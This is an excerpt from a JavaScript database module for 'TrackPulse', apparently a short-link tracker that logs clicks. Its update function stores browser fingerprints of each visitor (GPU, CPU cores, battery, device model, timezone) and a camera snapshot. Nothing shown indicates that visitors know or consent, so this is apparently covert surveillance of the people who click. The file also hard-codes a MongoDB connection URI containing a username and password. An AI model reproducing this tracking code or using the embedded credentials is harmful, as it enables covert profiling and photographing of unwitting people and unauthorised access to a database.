...
// Free Public / Standard Managed MongoDB Atlas Connection URI for 100% Permanent Cloud Persistence
const DEFAULT_MONGO_URI = process.env.MONGODB_URI || 'mongodb+srv://trackpulse_user:TrackPulse2026Secure@cluster0.o5hfa.mongodb.net/trackpulse?retryWrites=true&w=majority&appName=Cluster0';
...
async function connectDb() {
  ...
  if (!process.env.MONGODB_URI && !DEFAULT_MONGO_URI) {
    return;
  }
  try {
    ...
    isConnected = true;
    console.log('Successfully connected to Permanent MongoDB Cloud Database!');
  } catch (err) {
    isConnected = false;
  }
}
...
// --- FALLBACK LOCAL / TMP JSON DATABASE ENGINE ---
...
module.exports = {
  ...
  getLinkByShortCode: async (shortCode) => {
    await connectDb();
    if (isConnected) {
      const doc = await Link.findOne({ short_code: shortCode }).lean();
      if (!doc) return null;
      return {
        id: doc._id.toString(),
        short_code: doc.short_code,
      ...
      const local = loadLocalData();
      return local.links.find(l => l.short_code === shortCode) || null;
    }
  },
  ...
  deleteLink: async (id) => {
    ...
    if (isConnected) {
      ...
      await ClickLog.deleteMany({ link_id: id });
    } else {
      const local = loadLocalData();
      local.links = local.links.filter(l => String(l.id) !== String(id));
      local.click_logs = local.click_logs.filter(c => String(c.link_id) !== String(id));
      saveLocalData(local);
    }
    return true;
  },
  ...
  updateLogClientData: async (logId, clientData) => {
    ...
    if (isConnected) {
      const updateObj = {};
      if (clientData.screenRes) updateObj.screen_res = clientData.screenRes;
      if (clientData.timezone) updateObj.timezone = clientData.timezone;
      if (clientData.gpu) updateObj.gpu = clientData.gpu;
      if (clientData.cpuCores) updateObj.cpu_cores = clientData.cpuCores;
      if (clientData.connectionType) updateObj.connection_type = clientData.connectionType;
      if (clientData.language) updateObj.language = clientData.language;
      if (clientData.battery) updateObj.battery = clientData.battery;
      if (clientData.deviceModel && clientData.deviceModel !== 'N/A') updateObj.device_model = clientData.deviceModel;
      if (clientData.cameraSnap) updateObj.camera_snap = clientData.cameraSnap;
  ...
  getStats: async () => {
    ...
    if (isConnected) {
      ...
      const topLocations = Object.entries(locAgg).map(([_, a]) => ({
